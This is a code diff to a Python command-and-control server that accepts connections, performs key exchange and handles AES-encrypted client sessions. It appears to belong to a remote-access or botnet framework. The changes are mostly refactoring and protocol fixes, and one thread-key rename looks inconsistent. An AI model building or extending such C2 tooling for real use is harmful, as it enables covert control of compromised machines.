@@ -646,11 +646,6 @@ class C2():
         while True:
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
-            info = self.database.handle_session(session.info)
-            if isinstance(info, dict):
-                session.info = info
-            self.sessions[self._count] = session
-            self._count += 1
             util.display("\n\n\t[+]", color='green', style='bright', end=',')
             util.display("New Connection:", color='white', style='bright', end=',')
             util.display(address[0], color='white', style='normal')
@@ -658,6 +653,14 @@ class C2():
             util.display(str(self._count), color='white', style='normal')
             util.display("\t    Started:", color='white', style='bright', end=',')
             util.display(time.ctime(session._created) + "\n", color='white', style='normal')
+            self.database._display(session.info)
+            info = self.database.handle_session(session.info)
+            self.database._display(session.info)
+            if isinstance(info, dict):
+                session.info = info
+            self.sessions[self._count] = session
+            self._count += 1
+
             prompt = self.current_session._prompt if self.current_session else self._prompt
             util.display(prompt, color=self._prompt_color, style=self._prompt_style, end=',')
             abort = globals()['__abort']
@@ -671,7 +674,7 @@ class C2():
         """
         self._active.set()
         if 'c2_server' not in globals()['__threads']:
-            globals()['__threads']['c2_server'] = self.serve_until_stopped()
+            globals()['__threads']['c2'] = self.serve_until_stopped()
         while True:
             try:
                 self._active.wait()
@@ -730,7 +733,7 @@ class Session(threading.Thread):
         self.connection = connection
         self.id = id
         self.key = security.diffiehellman(self.connection)
-        self.info = self.client_info()
+        self.info = self.recv_task()
 
     def kill(self):
         """ 
@@ -749,12 +752,12 @@ class Session(threading.Thread):
         to identify the session
         
         """
-        header_size = struct.calcsize("L")
+        header_size = struct.calcsize("!L")
         header = self.connection.recv(header_size)
-        msg_size = struct.unpack(">L", header)[0]
+        msg_size = struct.unpack("!L", header)[0]
         msg = self.connection.recv(msg_size)
-        text = security.decrypt_aes(msg, self.key)
-        info = json.loads(text)
+        data = security.decrypt_aes(msg, self.key)
+        info = json.loads(data)
         return info
 
     def status(self):
@@ -807,10 +810,10 @@ class Session(threading.Thread):
           :attr datetime completed:  time task was completed by client
 
         """
-        hdr_len = struct.calcsize('!L')
-        hdr = self.connection.recv(hdr_len)
-        msg_len = struct.unpack('!L', hdr)[0]
-        msg = self.connection.recv(msg_len)
+        header_size = struct.calcsize('!L')
+        header = self.connection.recv(header_size)
+        msg_size = struct.unpack('!L', header)[0]
+        msg = self.connection.recv(msg_size)
         data = security.decrypt_aes(msg, self.key)
         return json.loads(data)
 
@@ -852,10 +855,10 @@ class Session(threading.Thread):
                             break
                     self._prompt = None
             except Exception as e:
-        		util.log(str(e))
-        		globals()['c2'].session_remove(self.id)
-                time.sleep(1)
+                util.log(str(e))
                 break
+        time.sleep(1)
+        globals()['c2'].session_remove(self.id)
         self._active.clear()
         globals()['c2']._return()
 
